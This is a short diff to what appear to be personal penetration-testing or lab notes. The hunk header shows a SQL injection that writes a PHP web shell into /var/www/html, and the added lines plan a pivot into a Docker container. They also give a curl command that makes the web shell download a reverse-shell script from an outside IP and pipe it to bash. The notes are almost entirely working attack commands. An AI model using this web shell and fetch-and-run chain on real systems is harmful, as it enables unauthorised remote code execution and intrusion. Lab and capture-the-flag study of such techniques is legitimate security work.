@@ -60,6 +60,10 @@ select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/she
 ```
 ![[Pasted image 20240817230257.png]]
 
-```
 
+We will try to get the shell from the Docker now
+Attacker -> Linux Server 
+Linux -> Docker ()
+```
+curl 192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.51.9.13%3A80%2Fphp_rev.sh%7Cbash%20%26
 ```
